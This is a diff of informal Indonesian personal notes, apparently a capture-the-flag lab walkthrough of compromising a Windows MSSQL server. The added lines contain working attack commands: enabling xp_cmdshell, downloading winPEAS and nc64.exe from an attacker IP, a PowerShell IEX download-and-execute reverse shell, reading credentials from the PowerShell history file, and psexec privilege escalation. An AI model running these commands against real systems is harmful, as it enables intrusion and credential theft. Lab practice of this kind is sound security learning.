@@ -5,4 +5,20 @@
 5. nah dapet catatan creds microsoft sql -> cari aja gini : impacket microsoft sql server
 6. dapet tuh toolsnya juga dapet jalanin gini aja -> python3 tool.py db@ip -windows-auth -> kan di creds tadi ada gibi SEBUS/sql_srv nah pake sql_srv@ip 
 7. ato gini aja -> python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.186.114 -windows-auth
-8. udah di shell sql -> help dulu aja ->  
+8. udah di shell sql -> help dulu aja -> ngeod ternyata gabisa scriptnya pake yg asli ini aja
+9. impacket-mssqlclient sql_svc@10.129.55.196 -windows-auth
+10. dah tinggal enable aja terus reconfigure terus xp_cmdshell whoami
+11. wget dari windows gini -> certutil -urlcache -f ip:port/winpeas C:\Windows\Temp\ 
+12. run gini -> lokasi > C:\Windows\Temp\fold\scan.txt -> type aja scan.txt nya
+13. winpeas kanjuy gabisa di run entah lah bingung
+14. beralih ke nc64 aja : xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.62:6969/nc64.exe -outfile nc64.exe"
+15. sambil http server python -> gabisa smeua dah pake powershell aja coba
+16. xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.62:6969/shell.ps1\");"    
+17. di winpeas harusnya ada dan bisa -> ada creds disini: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+18. pake ps1 bisa jir buat revshell enak 
+
+
+pe:
+1. kan dapat creds tuh dari log winpeas yang history itu
+2. pake aja psexec -> impacket-psexec administrator@ip -> passwd nya tadi
+3. klaim aja flag2 nya   
